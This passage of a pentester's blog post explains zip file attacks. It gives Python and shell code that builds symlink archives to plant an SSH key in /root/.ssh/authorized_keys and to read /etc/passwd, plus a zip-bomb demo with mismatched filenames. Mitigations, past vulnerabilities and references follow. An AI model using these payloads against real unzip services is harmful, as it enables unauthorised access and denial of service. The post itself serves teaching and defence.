<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"evil-link-dir.zip"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> compression<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">zip</span><span class="token punctuation">:</span>
  info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"dirlink"</span><span class="token punctuation">)</span>
  info<span class="token punctuation">.</span>create_system <span class="token operator">=</span> <span class="token number">0</span>
  info<span class="token punctuation">.</span>external_attr <span class="token operator">=</span> <span class="token punctuation">(</span>stat<span class="token punctuation">.</span>S_IFLNK <span class="token operator">|</span> <span class="token number">0o777</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span>
  <span class="token builtin">zip</span><span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>info<span class="token punctuation">,</span> <span class="token string">"/root/.ssh/"</span><span class="token punctuation">)</span>

  <span class="token comment"># Add an file from our filesystem. (Not a symlink.)</span>
  <span class="token builtin">zip</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"my-ssh-key.pub"</span><span class="token punctuation">,</span> <span class="token string">"dirlink/authorized_keys"</span><span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>For a double symlink attack (file symlink + dir symlink), we just combine the two methods and create two symlinks.</p><div class="code-toolbar"><pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># evil-link-dir.zip</span>
<span class="token comment"># └── dirlink/           -&gt; /some/readable/directory/</span>
<span class="token comment">#     └── passwd.html    -&gt; /etc/passwd</span>
<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"evil-link-dir-file.zip"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> compression<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">zip</span><span class="token punctuation">:</span>
  <span class="token comment"># Order matters! Write dir first, then file.</span>
  info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"dirlink"</span><span class="token punctuation">)</span>
  info<span class="token punctuation">.</span>create_system <span class="token operator">=</span> <span class="token number">0</span>
  info<span class="token punctuation">.</span>external_attr <span class="token operator">=</span> <span class="token punctuation">(</span>stat<span class="token punctuation">.</span>S_IFLNK <span class="token operator">|</span> <span class="token number">0o777</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span>
  <span class="token builtin">zip</span><span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>info<span class="token punctuation">,</span> <span class="token string">"/some/readable/directory/"</span><span class="token punctuation">)</span>

  info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"dirlink/passwd.html"</span><span class="token punctuation">)</span>
  info<span class="token punctuation">.</span>create_system <span class="token operator">=</span> <span class="token number">0</span>
  info<span class="token punctuation">.</span>external_attr <span class="token operator">=</span> <span class="token punctuation">(</span>stat<span class="token punctuation">.</span>S_IFLNK <span class="token operator">|</span> <span class="token number">0o777</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span>
  <span class="token builtin">zip</span><span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>info<span class="token punctuation">,</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><details><summary>With Shell Commands</summary><div class="details-content"><p>Shell commands also work. (Make sure to use <code>-y</code>/<code>--symlinks</code> when zipping symlinks. Otherwise, you'd be adding your actual <code>/etc/passwd</code>!)</p><p>Double symlink payload construction:</p><div class="code-toolbar"><pre class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span></span><span data-prompt="$"></span><span data-prompt="$"></span><span></span><span data-prompt="$"></span></span><span class="token output">Create our (soft) links.</span>
<span class="token command"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /some/readable/directory/ dirlink</span>
<span class="token command"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /etc/passwd dirlink/passwd.txt</span>
<span class="token output">Zip the links. (Order matters!)</span>
<span class="token command"><span class="token function">zip</span> <span class="token parameter variable">-y</span> evil-link-dir-file dirlink dirlink/passwd.txt</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Note that this approach will leave leftover files.</p><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><h4 id="limitations-of-zip-symlink-attacks" tabindex="-1"><a class="md-anchor" href="#limitations-of-zip-symlink-attacks" aria-hidden="true"></a> Limitations of Zip Symlink Attacks</h4><ul><li>Permissions on Linux.<ul><li>To create a symlink, we need execute permissions in the source directory (where the linked file is located) and write/execute permissions in the target directory (where the symlink is created).<sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup></li><li>Reading a symlink requires execute permissions in the source directory, and read permissions on the source file.</li></ul></li><li>Permissions on Windows. By default, only Administrators have the privilege to <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/create-symbolic-links" rel="noreferrer" target="_blank">create symbolic links</a>. This setting can be changed by <a href="https://superuser.com/a/105381" rel="noreferrer" target="_blank">editing the local group policy</a> or by directly enabling <code>SeCreateSymbolicLinkPrivilege</code>.</li><li>Although symlink attacks are cool and all, they're relatively rare (in the wild) compared to Zip Slip. Perhaps symlinks are handled with extra care.</li></ul><h3 id="zip-bombs" tabindex="-1"><a class="md-anchor" href="#zip-bombs" aria-hidden="true"></a> Zip Bombs 💣</h3><p>Since we're talking about attacks, let's also cover zip bombs for completeness.</p><p>Zip bombs are designed to cripple computers, systems, and virus scanners (rather than read sensitive data or escalate privileges, like Zip Slip and symlink attacks). Much like the well-memed <a href="https://en.wikipedia.org/wiki/Fork_bomb" rel="noreferrer" target="_blank">fork bomb</a>, a zip bomb attempts to drain system resources.</p><div class="center rw mb-2 h-auto lightbox-gallery"><a class="" title="" href="/img/68j4sr9h3dg21-1080w.webp"><img class="multi" src="/img/68j4sr9h3dg21-1080w.webp" loading="lazy" decoding="async" style="width:28.52%;aspect-ratio: auto 1080 / 1070" alt="undefined" title="undefined" srcset="/img/68j4sr9h3dg21-256w.webp 256w, /img/68j4sr9h3dg21-512w.webp 512w, /img/68j4sr9h3dg21-1024w.webp 1024w, /img/68j4sr9h3dg21-1080w.webp 1080w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1080px"></a><a class="" title="" href="/img/r_674011_CfdZB-627w.webp"><img class="multi" src="/img/r_674011_CfdZB-627w.webp" loading="lazy" decoding="async" style="width:35.5%;aspect-ratio: auto 627 / 499" alt="undefined" title="undefined" srcset="/img/r_674011_CfdZB-256w.webp 256w, /img/r_674011_CfdZB-512w.webp 512w, /img/r_674011_CfdZB-627w.webp 627w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 627px"></a><a class="" title="" href="/img/posts/infosec/attack-of-the-zip/assets/unzip42-523w.webp"><img class="multi" src="/img/posts/infosec/attack-of-the-zip/assets/unzip42-523w.webp" loading="lazy" decoding="async" style="width:30.98%;aspect-ratio: auto 523 / 477" alt="undefined" title="undefined" srcset="/img/posts/infosec/attack-of-the-zip/assets/unzip42-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/unzip42-512w.webp 512w, /img/posts/infosec/attack-of-the-zip/assets/unzip42-523w.webp 523w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 523px"></a></div><p class="caption"><sup>Some fork bomb memes. And zip bomb memes adapted from fork bomb memes. Zip bomb memes where?<sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup></sup></p><p>The basic principle abuses the <em><strong>deflate</strong></em><sup class="footnote-ref"><a href="#fn4" id="fnref4">4</a></sup> compression format to achieve compression ratios of up to <a href="https://stackoverflow.com/a/16794960/10239789" rel="noreferrer" target="_blank">1032:1</a>. This means after compression, every byte of compressed data can represent <em>up to</em> 1032 bytes of <em>uncompressed</em> data.</p><p>Zip bombs approach this ratio by compressing a file with highly-repetitive patterns (e.g. all zeros) which can be counted and grouped compactly.</p><details><summary>Why are highly-repetitive patterns 'easier to compress'?</summary><div class="details-content"><p>To see why repetitive patterns facilitate compression, consider an analogy with run-length encoding. If we want to compress <code>1111222233334444</code>, we would say <code>four 1s, four 2s, four 3s, four 4s</code> which has a compression ratio of 12 characters to 8 words. But if we want to compress <code>1111111111111111</code>, we would say <code>twelve 1s</code>, which has a higher compression ratio of 12 characters to <em>2</em> words.</p><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><p>The well-known <a href="https://web.archive.org/web/20250126204307/https://unforgettable.dk/" rel="noreferrer" target="_blank">42.zip</a> bomb is only 42KB, but contains 5 layers of zips upon zips. Unzipping the first layer yields a harmless 0.6MB. But recursively uncompressed, it yields an astronomical payload of <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="4,503,599,626,321,920 bytes, to be exact">4.5PB (petabytes, 15 zeros)</abbr>!</p><p>Most decompression tools and virus scanners are wary of zip bombs, and only unzip the first (few) layers or stop after identifying a zip file.</p><p>In 2019, David Fifield introduced <em>a better zip bomb</em>, which abuses the structure of a .zip, toying with metadata to trick decompressors into puking ungodly amounts of data.<sup class="footnote-ref"><a href="#fn5" id="fnref5">5</a></sup> A 42KB, compressed Fifield zip bomb yields 5.4GB of uncompressed bytes. This is just the first level of decompression! This metadata trickery is more generally known as <strong>Metadata Spoofing</strong>.</p><h4 id="diy-build-your-own-zip-bomb" tabindex="-1"><a class="md-anchor" href="#diy-build-your-own-zip-bomb" aria-hidden="true"></a> DIY: Build your own Zip Bomb!</h4><p>Here's a small demo on a Linux shell:</p><div class="code-toolbar"><pre class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span></span><span data-prompt="$"></span><span></span><span></span><span data-prompt="$"></span><span></span><span></span><span data-prompt="$"></span><span></span><span></span><span></span></span><span class="token output">Create a blank file with 5GB of null bytes.</span>
<span class="token command"><span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>/dev/zero <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">20000</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">250000</span> <span class="token operator">&gt;</span>zero.txt</span>
<span class="token output"></span>
<span class="token output">Zip it.</span>
<span class="token command"><span class="token function">zip</span> test.zip test.txt</span>
<span class="token output"></span>
<span class="token output">Count the number of bytes.</span>
<span class="token command"><span class="token function">wc</span> <span class="token parameter variable">-c</span> zero.txt zero.zip</span>
<span class="token output"> 5000000000 zero.txt</span>
<span class="token output"> 4852639 zero.zip</span>
<span class="token output"> 5004852639 total</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>From 5GB, we've gone down to ~4.9MB! A few of these could exhaust most virtual machines.</p><h2 id="zip-vulnerabilities-in-the-wild" tabindex="-1"><a class="md-anchor" href="#zip-vulnerabilities-in-the-wild" aria-hidden="true"></a> Zip Vulnerabilities in the Wild</h2><p>Here are some notable zip vulnerabilities in the past decade:</p><ul><li><a href="https://blog.ostorlab.co/zip-packages-exploitation.html" rel="noreferrer" target="_blank">Multiple Zip Vulnerabilities across Flutter and Swift Packages</a> (2023)</li><li><a href="https://vulners.com/prion/PRION:CVE-2021-23521" rel="noreferrer" target="_blank">Zip Symlink Vulnerability in Juce</a> (2021)</li><li><a href="https://www.cvedetails.com/cve/CVE-2018-1000544" rel="noreferrer" target="_blank">Zip Slip</a> (2018) and <a href="https://www.cvedetails.com/cve/CVE-2019-16892/" rel="noreferrer" target="_blank">Metadata Spoofing</a> (2019) in Rubyzip</li><li><a href="https://github.com/snyk/zip-slip-vulnerability" rel="noreferrer" target="_blank">Zip Slip Bonanza in Multiple Languages/Frameworks/Packages</a> (2018 - 2019)</li></ul><p>Keep in mind zip files come in different forms. Here are some you might be familiar with:</p><ul><li>.docx, .pptx, .xlsx (Microsoft Documents),</li><li>.jar (Java Archive),</li><li>.apk (Android App),</li><li>.mscx (MuseScore File).</li></ul><p>Any service processing such files has potential to be vulnerable.</p><h2 id="mitigations-and-other-considerations" tabindex="-1"><a class="md-anchor" href="#mitigations-and-other-considerations" aria-hidden="true"></a> Mitigations and Other Considerations</h2><p><a class="lightbox-single" title="Credit: Cybrain/Adobe Stock" href="/img/171212_cyber_Defense-4160w.webp"><img class="rw float-right m-1 jw-40" src="/img/171212_cyber_Defense-4160w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 4160 / 2340" alt="Credit: Cybrain/Adobe Stock" title="Credit: Cybrain/Adobe Stock" srcset="/img/171212_cyber_Defense-256w.webp 256w, /img/171212_cyber_Defense-512w.webp 512w, /img/171212_cyber_Defense-1024w.webp 1024w, /img/171212_cyber_Defense-4160w.webp 4160w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 4160px"></a></p><p>So much for the offensive side. How about the defensive aspect? What approaches can we take to secure our systems?</p><p>Let's explore a few ways to mitigate zip attacks. (Some of these can also be applied to protect against other attacks, or may just be general improvements.)</p><h3 id="permissions" tabindex="-1"><a class="md-anchor" href="#permissions" aria-hidden="true"></a> Permissions</h3><p><em>For sysadmins.</em></p><p><a class="lightbox-single" title="Input sanitisation? Never heard of it!" href="/img/posts/infosec/attack-of-the-zip/assets/you-guys-apply-hardening-question-mark-500w.webp"><img class="mb-2 rw center jw-60" src="/img/posts/infosec/attack-of-the-zip/assets/you-guys-apply-hardening-question-mark-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 500" alt="Input sanitisation? Never heard of it!" title="Input sanitisation? Never heard of it!" srcset="/img/posts/infosec/attack-of-the-zip/assets/you-guys-apply-hardening-question-mark-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/you-guys-apply-hardening-question-mark-500w.webp 500w" sizes="(max-width: 256px) 256px, 500px"></a></p><div class="alert alert-success d-flex align-items-start"><i class="fas fa-lightbulb ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><ol><li>Avoid running applications as <code>root</code> or <code>Administrator</code>. Instead, run it with a minimum privilege user.</li></ol><p>Minimum meaning: enough permissions to get the job done, and only enabling higher permissions when needed. Typically, only read/write are needed. Maybe write permissions for log/upload directories.</p></div></div><p>In America, "all men are created equal". Not so in filesystems.</p><p>Reading, writing, and linking files depends on permissions. Setting appropriate permissions for the process and limiting the scope of an application can go a long way in preventing attackers from snooping secrets.</p><p>See <a href="#limitations-of-zip-slip">Limitations of Zip Slip</a> and <a href="#limitations-of-zip-symlink-attacks">Limitations of Zip Symlink Attacks</a> for details on relevant permissions.</p><h3 id="modern-antivirus" tabindex="-1"><a class="md-anchor" href="#modern-antivirus" aria-hidden="true"></a> Modern Antivirus</h3><p><em>For sysadmins and normies.</em></p><div class="alert alert-success d-flex align-items-start"><i class="fas fa-lightbulb ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><ol start="2"><li>Upgrade your (antivirus) software. Daily updates to malware signatures ensure your antivirus program stays equipped to detect and thwart emerging threats.</li></ol></div></div><p>Although zip bombs have targeted antivirus (AV) systems in the past, most <a href="https://www.microsoft.com/en-us/windows/learning-center/what-is-a-zip-bomb#:~:text=most%20modern%20antivirus%20programs%20are%20able%20to%20find" rel="noreferrer" target="_blank">modern AV programs can detect zip bombs</a> by recognising patterns and signatures.</p><h3 id="robust-code" tabindex="-1"><a class="md-anchor" href="#robust-code" aria-hidden="true"></a> Robust Code</h3><p><em>For software developers <strong>building/maintaining</strong> zip applications/libraries.</em></p><div class="alert alert-success d-flex align-items-start"><i class="fas fa-lightbulb ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><ol start="3"><li>Consider the nature of your application/library and handle edge cases. Prevent attack vectors where applicable.</li></ol></div></div><p>Although <code>/../</code> and symlinks can be used maliciously, they are technically allowed by the zip specification<sup class="footnote-ref"><a href="#fn6" id="fnref6">6</a></sup>. So... should your product implement protections against these? It depends.</p><ul><li>Are you developing an unzip application (for end-users) or a high-level unzip library (to be conveniently imported and used by application developers)?<ul><li>Then <strong>yes</strong>, you should prevent the aforementioned tricks entirely.</li></ul></li><li>Are you developing a low-level unzip library, closely following the zip spec?<ul><li>Then <strong>not necessarily</strong>, but you should play your part by using secure defaults where possible. The responsibility now falls on developers using your library to respect the defaults and assess potential risk.</li></ul></li></ul><details><summary>Code: Malicious Actors Hate This One Simple Trick!</summary><div class="details-content"><p>One common way to prevent arbitrary file write attacks is to:</p><ol><li>resolve the canonical path of the target file,<sup class="footnote-ref"><a href="#fn7" id="fnref7">7</a></sup> and</li><li>verify the path is within the unzip directory.</li></ol><p>For instance, Juce v6.1.5 <a href="https://github.com/juce-framework/JUCE/commit/2e874e80cba0152201aff6a4d0dc407997d10a7f#diff-16f78a017ef48e7154eac2ea6b3ee3d211fa508f5465db0c7f2667741ca00265R438-R440" rel="noreferrer" target="_blank">added such a check</a>:</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fileToUnzip<span class="token punctuation">.</span><span class="token function">isAChildOf</span><span class="token punctuation">(</span>directoryToUnzipTo<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token comment">// Attack attempt detected: attempted write outside of unzip directory.</span>
  <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token double-colon punctuation">::</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token string">"..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><details><summary>Attack Vectors and Edge Cases to Consider</summary><div class="details-content"><p><em>For high-level unzip libraries and applications.</em></p><p>Checklist of edge cases to consider.</p><ul><li><code>..</code> (Zip Slip),</li><li>symlinks (zip symlink attacks),</li><li>potential uncompressed file size (especially if your application targets end-users or constrained systems).</li></ul><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><details><summary>Good Defaults</summary><div class="details-content"><p><em>For all unzip libraries and applications.</em></p><ul><li>Don't follow symlink directories.</li><li>Don't overwrite files. You don't want your existing files wiped out, right?</li></ul><p>It's a good idea to keep these defaults, unless you really need these features, and you're confident with the level of risk you're dealing with.</p><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><h3 id="unit-tests" tabindex="-1"><a class="md-anchor" href="#unit-tests" aria-hidden="true"></a> Unit Tests</h3><p><em>For software developers <strong>building/maintaining</strong> zip libraries.</em></p><div class="alert alert-success d-flex align-items-start"><i class="fas fa-lightbulb ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><ol start="4"><li>Adopt unit testing to verify your code works as intended. Add test cases against unintended situations.</li></ol></div></div><p>Test cases prevent <a href="https://en.wikipedia.org/wiki/Software_regression" rel="noreferrer" target="_blank">software regression</a> and automate the menial task of manual input. For example, Juce v6.1.5 also introduced a <a href="https://github.com/juce-framework/JUCE/commit/2e874e80cba0152201aff6a4d0dc407997d10a7f#diff-16f78a017ef48e7154eac2ea6b3ee3d211fa508f5465db0c7f2667741ca00265R700" rel="noreferrer" target="_blank">test case against Zip Slip</a>.</p><h2 id="tl-dr" tabindex="-1"><a class="md-anchor" href="#tl-dr" aria-hidden="true"></a> tl;dr</h2><p>A quick recap:</p><ul><li>There are generally three streams of zip attacks:<ul><li>Arbitrary File Write with Zip Slip</li><li>Arbitrary File Read/Write with Zip Symlink Attacks</li><li>Denial of Service with Zip Bombs and Metadata Spoofing</li></ul></li><li>Ways to counter zip attacks include:<ul><li>(Sysadmins) Run applications with a <em>minimum-privilege</em> user.</li><li>(Regular Users, Sysadmins) Regularly update antiviruses with new signatures.</li><li>(Software Developers) Adopt strong software development practices, including error handling, secure defaults, and unit tests.</li></ul></li></ul><p>While zip files offer convenience and efficiency in compressing and sharing data, we shouldn't overlook the security implications they can present. Hopefully this article left the reader with some understanding of their potential risks.</p><p><em>Anecdotes? Stories? New zip developments? Let me know by leaving a comment.</em> 🙂</p><h2 id="other-references" tabindex="-1"><a class="md-anchor" href="#other-references" aria-hidden="true"></a> Other References</h2><ul><li><a href="https://blog.pentesteracademy.com/from-zip-slip-to-system-takeover-8564433ea542" rel="noreferrer" target="_blank">PentesterAcademy: From Zip Slip to System Takeover</a></li><li><a href="https://web.archive.org/web/20221213052327/https://thesecurityvault.com/attacks-with-zip-files-and-mitigations/" rel="noreferrer" target="_blank">SecurityVault: Attacks with Zip Files and Mitigations</a></li><li><a href="https://gist.github.com/TrebledJ/c5c9d469b77c6e4a4c061de59392c1e7" rel="noreferrer" target="_blank">zipattack.py</a> - various functions to construct zip payloads in Python</li></ul><hr class="footnotes-sep"><b>Footnotes</b><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>Okay, some steps were skipped here for the sake of simplicity. The long answer is: reading a symlink also depends on permissions of the <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="the file linked by the symlink">source file</abbr> and the <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="the directory containing the source file">source directory</abbr>. <em><strong>If</strong></em> we can read files in our upload directory <strong>and</strong> if we have sufficient permissions, then we can (potentially) have arbitrary file read. See <a href="#limitations-of-zip-symlink-attacks">Limitations</a>. <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p>Reference: <a href="https://stackoverflow.com/questions/40667014/linux-what-are-the-minimum-permissions-required-to-create-a-link-to-a-file" rel="noreferrer" target="_blank">SO: Minimum Permissions Required to Create a Link to a File</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p>There probably aren't as many memes on zip bombs as they tend to be a software bug which can be swiftly patched. <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p>This is the same compression algorithm used in gzip (commonly used for transferring files across the web) and PNGs. <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p>Fifield's article on "a better zip bomb": <em>https://www.bamsoftware.com/hacks/zipbomb/</em>. (It may be blocked on some browsers.) <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p>Reference: <a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT" rel="noreferrer" target="_blank">PKWare Mirror</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p></li><li id="fn7" class="footnote-item"><p>Canonical path means no <code>./</code>, no <code>../</code>, no <code>~/</code>, no symlinks. Just a directory built directly from <code>/</code>. <a href="#fnref7" class="footnote-backref">↩︎</a></p></li></ol></section></div><a id="end-of-article"></a><br><script defer src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><div class="post-share dim-gentle mb-3 d-flex flex-row align-items-center"><div class="d-flex flex-row flex-wrap align-items-center gap-3"><span>Share&nbsp;on</span> <a class="no-decoration" data-sharer="reddit" data-title="From Compression to Compromise: Unmasking Zip File Threats" data-url="/posts/attack-of-the-zip/"><span class="fs-4"><i class="fab fa-reddit"></i> </span></a><a class="no-decoration" data-sharer="telegram" data-title="From Compression to Compromise: Unmasking Zip File Threats" data-url="/posts/attack-of-the-zip/"><span class="fs-4"><i class="fab fa-telegram"></i> </span></a><a class="no-decoration" data-sharer="whatsapp" data-title="From Compression to Compromise: Unmasking Zip File Threats" data-url="/posts/attack-of-the-zip/"><span class="fs-4"><i class="fab fa-whatsapp"></i> </span></a><a class="no-decoration" data-sharer="linkedin" data-title="From Compression to Compromise: Unmasking Zip File Threats" data-url="/posts/attack-of-the-zip/"><span class="fs-4"><i class="fab fa-linkedin"></i> </span></a><a class="no-decoration" data-sharer="vk" data-title="From Compression to Compromise: Unmasking Zip File Threats" data-url="/posts/attack-of-the-zip/"><span class="fs-4"><i class="fab fa-vk"></i> </span></a><a class="no-decoration" data-sharer="twitter" data-title="From Compression to Compromise: Unmasking Zip File Threats" data-url="/posts/attack-of-the-zip/"><span class="fs-4"><i class="fab fa-twitter"></i> </span></a><a id="copy-link-button" class="no-decoration" data-bs-toggle="tooltip" data-bs-trigger="click" title="Link copied!"><span class="fs-4"><i class="fas fa-link"></i></span></a></div></div><hr><div id="post-author-container" class="d-flex justify-content-between align-items-center gap-3" itemprop="author" itemscope itemtype="https://schema.org/Person"><img src="/img/profile-icon.jpg" class="profile-img" alt="" loading="lazy" decoding="async" itemprop="image"><div class="author-info d-flex flex-column gap-1"><p class="profile-name" itemprop="name">TrebledJ</p><p class="profile-bio" itemprop="description">Passionate problem-solver, pentester, and autodidact. I thrive on learning new things and enjoy passing it on. When not immersed in bughunting or programming, I can be found taking walks, composing a short tune, and occasionally indulging in CTF challenges.</p></div></div><hr class="section-sep"><div id="related" class="jw-100"><h3><i class="fas fa-circle-nodes me-2"></i>Related Posts</h3><div class="row gx-3 mt-4"><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/abusing-server-side-rendering-in-drogon/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/abusing-server-side-rendering-in-drogon/"><img class="post-img-blurred-bg" src="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 288" alt="Thumbnail for Dynamic Views Loading – Abusing Server Side Rendering in Drogon" srcset="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1024w.webp 1024w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1600w.webp 1600w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 288" alt="Thumbnail for Dynamic Views Loading – Abusing Server Side Rendering in Drogon" srcset="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1024w.webp 1024w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1600w.webp 1600w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Dynamic Views Loading – Abusing Server Side Rendering in Drogon</h2><div class="post-summary"><p>What could go wrong releasing a C++ web server with "live reload" into the wild?</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a> </span><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/automating-boolean-sql-injection-with-python/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/automating-boolean-sql-injection-with-python/"><img class="post-img-blurred-bg" src="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 273" alt="Thumbnail for Automating Boolean-Based SQL Injection with Python" srcset="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-256w.webp 256w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp 512w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1024w.webp 1024w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1800w.webp 1800w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 273" alt="Thumbnail for Automating Boolean-Based SQL Injection with Python" srcset="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-256w.webp 256w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp 512w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1024w.webp 1024w, 